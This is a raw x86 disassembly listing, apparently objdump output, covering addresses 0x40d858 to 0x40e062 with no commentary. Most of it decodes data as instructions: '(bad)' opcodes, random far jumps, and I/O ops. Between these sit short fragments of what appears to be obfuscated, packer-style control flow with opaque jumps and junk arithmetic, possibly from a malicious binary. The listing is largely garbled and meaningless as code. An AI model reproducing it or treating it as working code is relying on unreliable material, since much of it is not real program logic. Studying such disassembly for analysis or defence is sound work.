  40d858:	xchg   edi,eax
  40d859:	push   ebx
  40d85a:	call   0x6ee5d9cc
  40d85f:	int3   
  40d860:	jo     0x40d898
  40d862:	(bad)  
  40d863:	fcom   st(4)
  40d865:	inc    esp
  40d866:	scas   eax,DWORD PTR es:[edi]
  40d867:	(bad)  
  40d868:	fs jo  0x40d805
  40d86b:	les    edx,FWORD PTR [edx]
  40d86d:	in     al,dx
  40d86e:	lods   eax,DWORD PTR ds:[esi]
  40d86f:	dec    eax
  40d870:	idiv   DWORD PTR [edx]
  40d872:	mov    ah,0xa9
  40d874:	and    DWORD PTR [esi+0x7880bfe5],0xffffffe4
  40d87b:	lock jmp 0x40d882
  40d87e:	pop    ss
  40d87f:	aad    0xb7
  40d881:	inc    esp
  40d882:	shl    BYTE PTR [esi],0x3c
  40d885:	test   ah,ch
  40d887:	pop    eax
  40d888:	imul   BYTE PTR [ebx]
  40d88a:	and    eax,0x12d920d3
  40d88f:	xchg   esp,eax
  40d890:	mov    ebx,0xb1dde243
  40d895:	imul   ebp,DWORD PTR [edx+0x78],0xbabc675b
  40d89c:	lea    ebx,[edx]
  40d89e:	cwde   
  40d89f:	fmul   DWORD PTR [esi+0x621f76d8]
  40d8a5:	ret    
  40d8a6:	pop    ebp
  40d8a7:	arpl   cx,bx
  40d8a9:	push   ebp
  40d8aa:	xor    ah,al
  40d8ac:	out    0x78,al
  40d8ae:	inc    ebp
  40d8af:	loop   0x40d89b
  40d8b1:	xor    dl,BYTE PTR [edx-0x24]
  40d8b4:	sub    DWORD PTR [ebx],ecx
  40d8b6:	test   BYTE PTR [eax-0x24082b69],cl
  40d8bc:	test   eax,0x4de8d8ec
  40d8c1:	xchg   edx,eax
  40d8c2:	jae    0x40d84e
  40d8c4:	sub    BYTE PTR [ebp-0x6],al
  40d8c7:	retf   
  40d8c8:	or     DWORD PTR [edx+0x79ae1072],esi
  40d8ce:	mov    ecx,0x3fb849e8
  40d8d3:	mov    ds:0x3d78b81c,eax
  40d8d8:	test   eax,0x9d436674
  40d8dd:	fild   QWORD PTR [eax+ebp*2-0xf]
  40d8e1:	push   ebx
  40d8e2:	push   ecx
  40d8e3:	mov    cs,edx
  40d8e5:	inc    eax
  40d8e6:	(bad)  
  40d8e7:	lods   eax,DWORD PTR ds:[esi]
  40d8e8:	mov    ebp,0xd7d7f7ac
  40d8ed:	inc    ebp
  40d8ee:	mov    eax,0x70e82327
  40d8f3:	inc    ebp
  40d8f4:	fidiv  WORD PTR [edx]
  40d8f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8f7:	mov    ebp,0xe0ab6bee
  40d8fc:	outs   dx,BYTE PTR ds:[esi]
  40d8fd:	pop    es
  40d8fe:	push   esi
  40d8ff:	push   edi
  40d900:	sub    ecx,eax
  40d902:	mov    DWORD PTR [ebp-0x4],ecx
  40d905:	mov    eax,ds:0x42f03c
  40d90a:	xor    ecx,ecx
  40d90c:	xor    ecx,DWORD PTR ds:0x43003c
  40d912:	sub    eax,ecx
  40d914:	xor    eax,DWORD PTR [eax+ecx*1]
  40d917:	mov    DWORD PTR [ebp-0x20],0x2a98
  40d91e:	cmp    DWORD PTR ds:0x43360c,0x0
  40d925:	jg     0x40d93e
  40d92b:	jmp    0x40d93e
  40d930:	push   DWORD PTR [ebp-0x24]
  40d933:	push   0x85d0
  40d938:	call   DWORD PTR ds:0x43c7c4
  40d93e:	mov    DWORD PTR [ebp-0x24],0x1
  40d945:	mov    DWORD PTR [ebp-0x28],0x5535
  40d94c:	jmp    0x40da28
  40d951:	popf   
  40d952:	mov    ch,0x2c
  40d954:	xor    al,0x2c
  40d956:	mov    ebp,0xca12bd9d
  40d95b:	ins    DWORD PTR es:[edi],dx
  40d95c:	add    ch,BYTE PTR [ebx]
  40d95e:	scas   al,BYTE PTR es:[edi]
  40d95f:	and    BYTE PTR [edi+0x90a9],cl
  40d965:	mov    edi,0x2b000000
  40d96a:	jo     0x40d921
  40d96c:	cmp    BYTE PTR [ebx+ebp*4-0x4f],ah
  40d970:	leave  
  40d971:	outs   dx,DWORD PTR ds:[esi]
  40d972:	(bad)  
  40d973:	adc    DWORD PTR [bp+si+0x7272],edx
  40d978:	push   ds
  40d979:	retf   0x851f
  40d97c:	out    0x26,al
  40d97e:	int    0x4
  40d980:	mov    ds:0x9bb2a2ee,eax
  40d985:	pop    edx
  40d986:	mov    edi,0xfd4222e4
  40d98b:	jb     0x40d982
  40d98d:	xchg   esi,eax
  40d98e:	jns    0x40d97a
  40d990:	xchg   edi,eax
  40d991:	pushf  
  40d992:	add    eax,0x975c94f5
  40d997:	push   esp
  40d998:	lods   al,BYTE PTR ds:[esi]
  40d999:	lock and dh,ah
  40d99c:	push   0x5c40bbf0
  40d9a1:	mov    ch,0xcb
  40d9a3:	mov    dl,0x9c
  40d9a5:	pop    ecx
  40d9a6:	rcl    DWORD PTR [ecx],1
  40d9a8:	stos   DWORD PTR es:[edi],eax
  40d9a9:	idiv   BYTE PTR [edx]
  40d9ab:	arpl   dx,dx
  40d9ad:	jno    0x40d9e0
  40d9af:	daa    
  40d9b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9b1:	jecxz  0x40d95c
  40d9b3:	lds    eax,FWORD PTR [eax]
  40d9b5:	cwde   
  40d9b6:	les    eax,FWORD PTR [edi+0x6b2175f]
  40d9bc:	cmp    BYTE PTR [esi+eiz*8-0x6f852325],ch
  40d9c3:	in     al,dx
  40d9c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9c5:	xchg   DWORD PTR [edi-0x28],edx
  40d9c8:	jp     0x40d9ad
  40d9ca:	gs aad 0x29
  40d9cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9ce:	dec    ecx
  40d9cf:	ret    0xb984
  40d9d2:	jl     0x40da4d
  40d9d4:	pop    es
  40d9d5:	pop    esi
  40d9d6:	push   ebx
  40d9d7:	sbb    ebp,DWORD PTR [esi+0x613a87c0]
  40d9dd:	dec    ebx
  40d9de:	stos   BYTE PTR es:[edi],al
  40d9df:	(bad)
  40d9e4:	pop    ss
  40d9e5:	push   ecx
  40d9e6:	mov    dh,BYTE PTR [ebp-0x16f558a2]
  40d9ec:	jmp    0x9a87e30
  40d9f1:	pop    esi
  40d9f2:	mov    esi,0xc2e4f49b
  40d9f7:	das    
  40d9f8:	dec    eax
  40d9f9:	in     eax,dx
  40d9fa:	add    BYTE PTR [ebp-0x7bf995d8],0x3e
  40da01:	push   ebx
  40da02:	mov    ch,0xb3
  40da04:	mov    esp,0xcaa966df
  40da09:	push   edi
  40da0a:	mov    WORD PTR [eax-0x7336c585],?
  40da10:	mov    al,ds:0x3d06336f
  40da15:	stos   BYTE PTR es:[edi],al
  40da16:	fidivr WORD PTR [edi+0x41]
  40da19:	(bad)  
  40da1a:	pop    es
  40da1b:	push   0x2c6c2771
  40da20:	les    ebx,FWORD PTR [edi]
  40da22:	add    cl,BYTE PTR [esi-0x7d5e08b8]
  40da28:	mov    eax,DWORD PTR [ebp-0x28]
  40da2b:	mov    ecx,DWORD PTR [ebp-0x24]
  40da2e:	xor    eax,0x4166
  40da33:	div    ecx
  40da35:	mov    ecx,DWORD PTR [ebp-0x20]
  40da38:	mov    edx,DWORD PTR ds:0x432024
  40da3e:	mov    edx,DWORD PTR [edx]
  40da40:	add    DWORD PTR ds:0x433598,edx
  40da46:	imul   eax,ecx
  40da49:	mov    edx,DWORD PTR ds:0x430038
  40da4f:	mov    ecx,DWORD PTR ds:0x432034
  40da55:	sub    edx,ecx
  40da57:	and    edx,DWORD PTR [edx+ecx*1]
  40da5a:	sub    eax,0x361af48
  40da5f:	mov    ecx,DWORD PTR ds:0x433588
  40da65:	adc    ecx,DWORD PTR ds:0x4335f4
  40da6b:	mov    DWORD PTR ds:0x433588,ecx
  40da71:	jmp    0x40db4d
  40da76:	push   ebp
  40da77:	and    eax,0x97f113b1
  40da7c:	mul    DWORD PTR [edi-0x63]
  40da7f:	aam    0x72
  40da81:	lahf   
  40da82:	push   0x68690c5b
  40da87:	xchg   ecx,eax
  40da88:	add    BYTE PTR [eax],al
  40da8a:	mov    edi,0x33000000
  40da8f:	sbb    eax,0x46bf3ceb
  40da94:	or     eax,0x5bb1532e
  40da99:	bound  ebp,QWORD PTR [di-0x50]
  40da9d:	push   edx
  40da9e:	push   0xe9a1c700
  40daa3:	ins    BYTE PTR es:[edi],dx
  40daa4:	and    al,0xb8
  40daa6:	lea    esp,[eax-0x71]
  40daa9:	dec    edi
  40daaa:	popa   
  40daab:	rdpmc  
  40daad:	and    bh,0xf4
  40dab0:	push   0x3d2da327
  40dab5:	pop    esp
  40dab6:	test   eax,0x1f3311bc
  40dabb:	xchg   esi,eax
  40dabc:	ja     0x40da61
  40dabe:	inc    ebx
  40dabf:	and    BYTE PTR [esi],cl
  40dac1:	or     al,BYTE PTR [eax-0x64]
  40dac4:	add    DWORD PTR [edi-0x6a3076a4],eax
  40daca:	push   ecx
  40dacb:	fist   DWORD PTR [ecx]
  40dacd:	dec    ebp
  40dace:	sar    DWORD PTR [ebp+0x171e865c],1
  40dad4:	jle    0x40da5a
  40dad6:	jle    0x40db55
  40dad8:	(bad)  
  40dad9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dada:	jg     0x40daa1
  40dadc:	cmp    ch,bh
  40dade:	and    BYTE PTR es:[edx-0x765f921],ch
  40dae5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dae6:	imul   edx,DWORD PTR [ecx+0x4b],0xffffffb5
  40daea:	test   DWORD PTR [edi+0x3942ec38],esp
  40daf0:	lds    ebp,FWORD PTR [edi]
  40daf2:	add    esi,DWORD PTR [ebx]
  40daf4:	out    0xd4,eax
  40daf6:	sbb    al,0xfa
  40daf8:	loop   0x40db1c
  40dafa:	adc    eax,0x27e54f7c
  40daff:	arpl   sp,ax
  40db01:	push   cs
  40db02:	shr    DWORD PTR [ecx-0x6],cl
  40db05:	pop    ss
  40db06:	jmp    0x86a357e6
  40db0b:	stc    
  40db0c:	stos   BYTE PTR es:[edi],al
  40db0d:	loope  0x40dabe
  40db0f:	sub    ah,BYTE PTR [esi]
  40db11:	adc    al,0x5f
  40db13:	sahf   
  40db14:	add    bh,BYTE PTR [edi-0x76]
  40db17:	sub    eax,edi
  40db19:	out    0x3,al
  40db1b:	call   DWORD PTR [eax-0x35e57472]
  40db21:	test   al,0x95
  40db23:	cmp    BYTE PTR [ecx],cl
  40db25:	mov    dl,0xe7
  40db27:	dec    ebp
  40db28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db29:	and    BYTE PTR [edx-0x44],bl
  40db2c:	not    DWORD PTR [edx+0x49]
  40db2f:	fmul   QWORD PTR es:[esi+edi*8+0x60]
  40db34:	sahf   
  40db35:	and    eax,DWORD PTR [ecx+0xa]
  40db38:	bswap  eax
  40db3a:	repnz pushf 
  40db3c:	pop    edi
  40db3d:	pushf  
  40db3e:	xor    eax,0xd8d536d2
  40db43:	pop    ds
  40db44:	mov    ah,0xf5
  40db46:	cmp    cl,BYTE PTR [ebx+0x4e]
  40db49:	sub    ah,BYTE PTR [edx]
  40db4b:	inc    edi
  40db4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db4d:	mov    DWORD PTR [ebp-0x4],eax
  40db50:	mov    DWORD PTR [ebp-0x10],0x4e5b
  40db57:	add    DWORD PTR ds:0x4335f0,0x58c6
  40db61:	mov    DWORD PTR [ebp-0x1c],0x242
  40db68:	mov    edx,DWORD PTR ds:0x43354c
  40db6e:	xor    edx,DWORD PTR ds:0x433598
  40db74:	mov    DWORD PTR ds:0x43354c,edx
  40db7a:	mov    DWORD PTR [ebp-0x20],0x159f
  40db81:	mov    eax,0x2044
  40db86:	mov    DWORD PTR [ebp-0x24],eax
  40db89:	mov    DWORD PTR [ebp-0x28],0x1f0f
  40db90:	add    DWORD PTR ds:0x4335d0,ebx
  40db96:	mov    ecx,DWORD PTR [ebp-0x28]
  40db99:	and    DWORD PTR ds:0x43358c,ecx
  40db9f:	jmp    0x40dc7b
  40dba4:	outs   dx,BYTE PTR ds:[esi]
  40dba5:	jl     0x40dc25
  40dba7:	clc    
  40dba8:	jle    0x40dba4
  40dbaa:	out    dx,al
  40dbab:	(bad)  
  40dbac:	push   ds
  40dbad:	jge    0x40dbb3
  40dbaf:	pop    edi
  40dbb0:	int3   
  40dbb1:	pop    edi
  40dbb2:	cmp    ah,BYTE PTR [ebp+0x9227]
  40dbb8:	mov    edi,0x22000000
  40dbbd:	je     0x40dc3c
  40dbbf:	mov    esp,edi
  40dbc1:	into   
  40dbc2:	jb     0x40dbf2
  40dbc4:	dec    BYTE PTR ds:0x45634bcd
  40dbca:	or     eax,0x3ce670f4
  40dbcf:	dec    edi
  40dbd0:	popa   
  40dbd1:	call   0xc6a9:0xde480d10
  40dbd8:	ror    DWORD PTR [edi],1
  40dbda:	inc    esp
  40dbdb:	dec    ebp
  40dbdc:	lods   eax,DWORD PTR ds:[esi]
  40dbdd:	mov    ecx,0xd2283e5
  40dbe2:	test   BYTE PTR [edx+0x3a55b2d5],dh
  40dbe8:	pop    ebp
  40dbe9:	xor    al,0xc5
  40dbeb:	xlat   BYTE PTR ds:[ebx]
  40dbec:	add    eax,0x4ba9975e
  40dbf1:	ret    
  40dbf2:	xchg   edi,eax
  40dbf3:	xchg   edx,eax
  40dbf4:	imul   ecx,DWORD PTR [ecx+0x6af8b4a0],0x1d
  40dbfb:	sbb    ecx,DWORD PTR [ebx-0x44a490d2]
  40dc01:	xchg   ebx,eax
  40dc02:	cmp    DWORD PTR [ebp-0x14],esi
  40dc05:	inc    eax
  40dc06:	stc    
  40dc07:	dec    esp
  40dc08:	and    eax,0x8b5dd0f9
  40dc0d:	lock jo 0x40dbef
  40dc10:	fsubr  QWORD PTR [esi+0x5e]
  40dc13:	ins    DWORD PTR es:[edi],dx
  40dc14:	mov    esi,0x3a9f3652
  40dc19:	mov    al,ds:0x43a73d63
  40dc1e:	out    dx,eax
  40dc1f:	mov    al,ds:0x715b9137
  40dc24:	sbb    ch,BYTE PTR [esi-0x55]
  40dc27:	sti    
  40dc28:	adc    al,0x39
  40dc2a:	jb     0xe3412b47
  40dc30:	cmp    ah,BYTE PTR [edi-0x1]
  40dc33:	sub    BYTE PTR ds:0x188b994a,0x70
  40dc3a:	or     eax,edx
  40dc3c:	jb     0x40dcb7
  40dc3e:	xchg   esi,eax
  40dc3f:	pusha  
  40dc40:	xchg   ebp,eax
  40dc41:	popf   
  40dc42:	inc    esp
  40dc43:	jmp    0x40dc35
  40dc45:	mov    ds:0x43f5f0be,eax
  40dc4a:	push   ebx
  40dc4b:	pop    ds
  40dc4c:	sbb    eax,0x954d4afd
  40dc51:	xchg   edi,eax
  40dc52:	xchg   DWORD PTR [ebx+0x198e2946],eax
  40dc58:	mov    al,ds:0x53a8e177
  40dc5d:	ror    BYTE PTR es:[edx-0x79],1
  40dc61:	sbb    al,0x1b
  40dc63:	cmp    edi,edx
  40dc65:	adc    edi,DWORD PTR [esi-0x5a]
  40dc68:	mov    edx,0xc13431f2
  40dc6d:	ret    0x1278
  40dc70:	sbb    DWORD PTR [ebp*4-0x1cd24873],ebp
  40dc77:	xchg   BYTE PTR [ebx],dh
  40dc79:	dec    ebx
  40dc7a:	ins    DWORD PTR es:[edi],dx
  40dc7b:	mov    edx,DWORD PTR [ebp-0x24]
  40dc7e:	and    DWORD PTR ds:0x433668,0x433604
  40dc88:	xor    ecx,0x39c2
  40dc8e:	and    ecx,edx
  40dc90:	xor    ecx,eax
  40dc92:	xor    DWORD PTR ds:0x4335c0,0x5477
  40dc9c:	jmp    0x40dd78
  40dca1:	pop    edx
  40dca2:	xchg   esi,eax
  40dca3:	pop    es
  40dca4:	or     eax,0xd75a9dcf
  40dca9:	inc    esp
  40dcaa:	mov    DWORD PTR [ecx],ecx
  40dcac:	mov    eax,ds:0x3849f0ad
  40dcb1:	out    0x92,al
  40dcb3:	add    BYTE PTR [eax],al
  40dcb5:	mov    edi,0xf1000000
  40dcba:	loopne 0x40dc8e
  40dcbc:	ror    DWORD PTR [ebx],0x43
  40dcbf:	imul   ebp,DWORD PTR [ebp+0x22],0x31
  40dcc3:	fwait
  40dcc4:	inc    esp
  40dcc5:	push   ds
  40dcc6:	cld    
  40dcc7:	jle    0x40dcc0
  40dcc9:	(bad)  
  40dcca:	mov    esp,DWORD PTR [ecx+ecx*1]
  40dccd:	push   ecx
  40dcce:	out    0xc5,al
  40dcd0:	fild   WORD PTR [ebx-0x5c740560]
  40dcd6:	std    
  40dcd7:	mov    edi,0x48345da5
  40dcdc:	je     0x40dc97
  40dcde:	scas   eax,DWORD PTR es:[edi]
  40dcdf:	and    ebx,DWORD PTR es:[edi]
  40dce2:	sub    eax,0xa56b2d17
  40dce7:	int3   
  40dce8:	dec    esi
  40dce9:	int    0xa3
  40dceb:	(bad)  
  40dced:	sbb    eax,0xc682175d
  40dcf2:	cmp    DWORD PTR [edi+0x5b336df],edi
  40dcf8:	hlt    
  40dcf9:	sub    al,0x63
  40dcfb:	sar    DWORD PTR [edi-0x113899dd],0x75
  40dd02:	cmc    
  40dd03:	mov    dl,0xe8
  40dd05:	fld    QWORD PTR [edx]
  40dd07:	adc    al,0xe9
  40dd09:	popf   
  40dd0a:	mov    edi,0x707178de
  40dd0f:	cmp    ebx,DWORD PTR [ebp-0x22]
  40dd12:	sahf   
  40dd13:	arpl   WORD PTR [edi-0x37d058e8],cx
  40dd19:	(bad)  
  40dd1a:	xor    eax,0x3d4ad9c0
  40dd1f:	jb     0x40dcb8
  40dd21:	xchg   ecx,eax
  40dd22:	cdq    
  40dd23:	mov    esp,0x1a8a4038
  40dd28:	mov    ch,BYTE PTR [esi-0xb]
  40dd2b:	inc    ebx
  40dd2c:	push   edi
  40dd2d:	fcom   QWORD PTR [eax]
  40dd2f:	push   cs
  40dd30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd31:	rcl    DWORD PTR [eax+0x6c8d2afd],cl
  40dd37:	test   BYTE PTR [ebx-0x7c02d169],cl
  40dd3d:	pop    ds
  40dd3e:	test   DWORD PTR [eax+0x7c],eax
  40dd41:	dec    ebx
  40dd42:	jnp    0x40dcc8
  40dd44:	adc    esi,DWORD PTR [edi+0x53d548bd]
  40dd4a:	les    ebp,FWORD PTR [ecx+0x19]
  40dd4d:	pop    ebp
  40dd4e:	mov    dh,0xd9
  40dd50:	adc    dh,BYTE PTR [esi]
  40dd52:	gs sahf 
  40dd54:	fwait
  40dd55:	imul   esi,DWORD PTR [ebx],0xffffff91
  40dd58:	mov    bh,0x33
  40dd5a:	stos   DWORD PTR es:[edi],eax
  40dd5b:	aaa    
  40dd5c:	mov    ebp,DWORD PTR [ecx+0x3c]
  40dd5f:	retf   
  40dd60:	or     al,0x4a
  40dd62:	jmp    0xa419:0x635a1a6e
  40dd69:	repz adc ecx,DWORD PTR [esi-0x46]
  40dd6d:	jmp    0x65291537
  40dd72:	daa    
  40dd73:	xchg   edi,eax
  40dd74:	and    DWORD PTR [edi-0x6b],ebp
  40dd77:	loope  0x40dd04
  40dd79:	inc    ebp
  40dd7a:	loopne 0x40dd07
  40dd7c:	adc    eax,0x43366c
  40dd81:	xor    DWORD PTR ds:0x433600,edx
  40dd87:	mov    edx,DWORD PTR [ebp-0x1c]
  40dd8a:	sub    DWORD PTR ds:0x433574,0x6cee
  40dd94:	imul   eax,edx
  40dd97:	cmp    DWORD PTR ds:0x43355c,0x0
  40dd9e:	ja     0x40de8e
  40dda4:	jmp    0x40de8e
  40dda9:	push   DWORD PTR [ebp-0x1c]
  40ddac:	call   DWORD PTR ds:0x43c7cc
  40ddb2:	jmp    0x40de8e
  40ddb7:	pop    eax
  40ddb8:	lds    cx,DWORD PTR [ecx]
  40ddbb:	jmp    FWORD PTR [ebx+0x32bd77dc]
  40ddc1:	sub    dh,BYTE PTR [ebx]
  40ddc3:	retf   
  40ddc4:	out    dx,eax
  40ddc5:	cmp    DWORD PTR gs:[ebp-0x40ffff6d],esp
  40ddcc:	add    BYTE PTR [eax],al
  40ddce:	add    BYTE PTR [ecx+0x3ad6cffe],ah
  40ddd4:	mov    bh,0x22
  40ddd6:	jb     0x40ddcb
  40ddd8:	jp     0x40dde7
  40ddda:	jb     0x40ddce
  40dddc:	ins    BYTE PTR es:[edi],dx
  40dddd:	or     al,0x9
  40dddf:	add    ebp,DWORD PTR [ebx+0x35d9a64e]
  40dde5:	in     eax,0x4
  40dde7:	dec    edi
  40dde8:	fnstcw WORD PTR ds:[ebp+0x2]
  40ddec:	inc    ecx
  40dded:	inc    ecx
  40ddee:	add    BYTE PTR [edi+ebp*8+0x47],al
  40ddf2:	daa    
  40ddf3:	(bad)  
  40ddf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddf5:	or     ah,al
  40ddf7:	push   edx
  40ddf8:	loopne 0x40de03
  40ddfa:	rol    DWORD PTR [esi],0xa9
  40ddfd:	mov    edx,0x16683ac
  40de02:	mov    WORD PTR [eax-0x80a7493],es
  40de08:	jnp    0x40de81
  40de0a:	mov    dl,0xc6
  40de0c:	ja     0x40dde6
  40de0e:	imul   edx,ebp,0x7d
  40de11:	aas    
  40de12:	cwde   
  40de13:	xlat   BYTE PTR ds:[ebx]
  40de14:	push   eax
  40de15:	cwde   
  40de16:	sub    eax,0x5e2aabfd
  40de1b:	loopne 0x40de83
  40de1d:	retf   0x9ae3
  40de20:	push   edi
  40de21:	rcr    ebx,1
  40de23:	push   ecx
  40de24:	popf   
  40de25:	aam    0xd2
  40de27:	rol    DWORD PTR [edx-0x59],0xd8
  40de2b:	icebp  
  40de2c:	div    BYTE PTR [edi]
  40de2e:	sub    DWORD PTR [edi],esi
  40de30:	mov    eax,ds:0xe85d0267
  40de35:	(bad)
  40de38:	outs   dx,DWORD PTR ds:[esi]
  40de39:	dec    ebx
  40de3a:	(bad)  
  40de3b:	shl    DWORD PTR [ebx-0x6b],1
  40de3e:	pop    ss
  40de3f:	mov    BYTE PTR [edx-0x6e],ah
  40de42:	add    eax,0xa11785b1
  40de47:	pop    ebp
  40de48:	jg     0x40de44
  40de4a:	stos   DWORD PTR es:[edi],eax
  40de4b:	icebp  
  40de4c:	dec    ebx
  40de4d:	mov    ch,0xb
  40de4f:	into   
  40de50:	pop    eax
  40de51:	adc    al,0xc
  40de53:	mov    eax,?
  40de55:	pop    ds
  40de56:	jns    0x40ddfb
  40de58:	xchg   esi,eax
  40de59:	sub    eax,0x8aa09a0a
  40de5e:	int3   
  40de5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de60:	mov    ch,0xd8
  40de62:	mov    ds:0x1e4f1198,al
  40de67:	jbe    0x40de62
  40de69:	ins    BYTE PTR es:[edi],dx
  40de6a:	add    DWORD PTR [esp+ebx*2+0x63],0x85cb4a43
  40de72:	sub    BYTE PTR [edi-0x61],0x6a
  40de76:	and    ah,BYTE PTR [esi-0x189033a2]
  40de7c:	and    ch,dh
  40de7e:	mov    ah,0x65
  40de80:	xrelease mov BYTE PTR [esi],0x6e
  40de84:	xchg   ecx,eax
  40de85:	mov    al,ds:0xb314f6c4
  40de8a:	mov    WORD PTR [eax+0x558b1a9a],?
  40de90:	adc    al,0x8b
  40de92:	or     al,0x11
  40de94:	lea    eax,[ecx+eax*1-0x311f59]
  40de9b:	mov    ecx,DWORD PTR [ebp-0x10]
  40de9e:	add    ecx,eax
  40dea0:	mov    DWORD PTR [ebp-0x8],ecx
  40dea3:	jmp    0x40df7f
  40dea8:	jecxz  0x40de87
  40deaa:	xchg   ecx,eax
  40deab:	hlt    
  40deac:	mov    edi,0xbdfe7fc
  40deb1:	test   DWORD PTR [eax-0x4b070d99],ebx
  40deb7:	in     al,0x64
  40deb9:	xchg   esp,eax
  40deba:	add    BYTE PTR [eax],al
  40debc:	mov    edi,0x12000000
  40dec1:	mov    al,BYTE PTR [edi-0x45]
  40dec4:	lahf   
  40dec5:	adc    al,0x2
  40dec7:	scas   al,BYTE PTR es:[edi]
  40dec8:	jl     0x40de6e
  40deca:	icebp  
  40decb:	jae    0x40de53
  40decd:	mov    WORD PTR [edx],?
  40decf:	add    al,0xc4
  40ded1:	repz dec esi
  40ded3:	xchg   ebx,eax
  40ded4:	(bad)  
  40ded5:	neg    DWORD PTR [edx-0x75d6f912]
  40dedb:	inc    ebp
  40dedc:	push   ecx
  40dedd:	dec    esi
  40dede:	and    DWORD PTR [ebp+0x62],0xffffffbd
  40dee2:	pop    ebp
  40dee3:	imul   ebx,DWORD PTR [ecx+eax*4-0x12ede4eb],0x5f
  40deeb:	and    esp,esp
  40deed:	or     esp,DWORD PTR [esi+0x6b4ce973]
  40def3:	imul   eax,DWORD PTR [edi+0x9],0xae133de8
  40defa:	rcr    DWORD PTR [esi+0x42b0ae9e],1
  40df00:	sbb    DWORD PTR [edi-0x5ee7a888],eax
  40df06:	jo     0x40def2
  40df08:	add    eax,DWORD PTR [eax+0x6d]
  40df0b:	jge    0x40df11
  40df0d:	pop    esi
  40df0e:	xor    eax,0x372b99ac
  40df13:	mov    edx,edx
  40df15:	rcl    BYTE PTR [esi+0xf],1
  40df18:	xor    al,0xc
  40df1a:	ud2    
  40df1c:	mov    eax,ds:0x26492d9c
  40df21:	sub    BYTE PTR [ebx-0x4b0640ef],bl
  40df27:	inc    eax
  40df28:	jmp    0xd6a726e3
  40df2d:	(bad)  
  40df2e:	call   0x9998e02e
  40df33:	inc    ebp
  40df34:	inc    eax
  40df35:	mov    eax,ds:0x6fa8a32
  40df3a:	js     0x40dfb0
  40df3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df3d:	imul   ebx,ecx,0x51
  40df40:	cmc    
  40df41:	xor    al,0xc1
  40df43:	js     0x40df78
  40df45:	out    dx,eax
  40df46:	out    0xef,eax
  40df48:	aas    
  40df49:	in     al,0x1c
  40df4b:	push   0xaa253fd0
  40df50:	iret   
  40df51:	xor    ch,BYTE PTR [ebx]
  40df53:	std    
  40df54:	mov    al,0x78
  40df56:	mov    al,0xa0
  40df58:	shr    DWORD PTR [ecx-0x5cc28f66],0xb4
  40df5f:	xchg   BYTE PTR [eax],bh
  40df61:	inc    ebp
  40df62:	scas   al,BYTE PTR es:[edi]
  40df63:	outs   dx,DWORD PTR ds:[esi]
  40df64:	fld    DWORD PTR [ecx+eax*1]
  40df67:	mov    ebx,0x7192bd41
  40df6c:	cmovne edx,DWORD PTR [edx-0x1de3d87f]
  40df73:	ror    BYTE PTR [edx],cl
  40df75:	shl    cl,0x6b
  40df78:	jle    0x40df14
  40df7a:	out    dx,al
  40df7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df7c:	ret    
  40df7d:	mov    esp,0xe045c79a
  40df82:	xchg   DWORD PTR [eax+eax*1+0x0],ebp
  40df86:	xor    eax,DWORD PTR ds:0x43363c
  40df8c:	mov    DWORD PTR [ebp-0x24],0x3
  40df93:	add    eax,DWORD PTR ds:0x433550
  40df99:	mov    DWORD PTR [ebp-0x28],0x998
  40dfa0:	cmp    DWORD PTR ds:0x43360c,0x0
  40dfa7:	jg     0x40dfd0
  40dfad:	add    DWORD PTR ds:0x433664,0x433580
  40dfb7:	jmp    0x40dfd0
  40dfbc:	push   DWORD PTR [ebp-0xc]
  40dfbf:	push   DWORD PTR [ebp-0x1c]
  40dfc2:	push   0x7e20
  40dfc7:	push   DWORD PTR [ebp-0x24]
  40dfca:	call   DWORD PTR ds:0x43c7fc
  40dfd0:	mov    eax,DWORD PTR [ebp-0x28]
  40dfd3:	jmp    0x40e0af
  40dfd8:	cld    
  40dfd9:	sahf   
  40dfda:	retf   
  40dfdb:	repz jmp 0x40dfd5
  40dfde:	cld    
  40dfdf:	lahf   
  40dfe0:	push   edx
  40dfe1:	mov    ah,0xbc
  40dfe3:	or     eax,0xa1bd6fae
  40dfe8:	and    edx,DWORD PTR [ebp+0xbf0000]
  40dfee:	add    BYTE PTR [eax],al
  40dff0:	js     0x40dfbf
  40dff2:	pusha  
  40dff3:	lock add al,0xed
  40dff6:	fdivr  DWORD PTR ds:0x1b3aaa5d
  40dffc:	push   0xffffffc4
  40dffe:	lea    ebp,[ebp-0x1bacc2e7]
  40e004:	rol    BYTE PTR [edx+ebx*1],0x8d
  40e008:	sub    esi,ecx
  40e00a:	repz sbb edi,ecx
  40e00d:	sbb    ecx,DWORD PTR [ecx+eax*4]
  40e010:	mov    cl,0x81
  40e012:	fcmovnb st,st(6)
  40e014:	or     eax,0xb455e2e8
  40e019:	lea    ecx,ds:0xad492ea4
  40e01f:	into   
  40e020:	fwait
  40e021:	push   ebp
  40e022:	xchg   ebp,eax
  40e023:	push   esi
  40e024:	(bad)  
  40e025:	je     0x40e039
  40e027:	xchg   ebx,eax
  40e028:	push   edx
  40e029:	adc    eax,0xa050c0ee
  40e02e:	(bad)  
  40e02f:	test   eax,0xddb11928
  40e034:	or     al,0x7a
  40e036:	mov    esi,0xeb26f798
  40e03b:	mul    DWORD PTR [edx+ebx*8]
  40e03e:	mov    ds:0x33bfbb05,eax
  40e043:	cmp    edi,DWORD PTR [ecx]
  40e045:	jo     0x40e009
  40e047:	and    DWORD PTR [ebx+0x33],esp
  40e04a:	rol    eax,cl
  40e04c:	or     dl,BYTE PTR [ecx+0x3c]
  40e04f:	push   ss
  40e050:	inc    esi
  40e051:	xchg   edx,eax
  40e052:	jns    0x40e0c0
  40e054:	ds sbb dh,bl
  40e057:	stos   BYTE PTR es:[edi],al
  40e058:	ret    0x894
  40e05b:	mov    edi,0xd6397b08
  40e060:	mov    al,0x2f
  40e062:	stc    
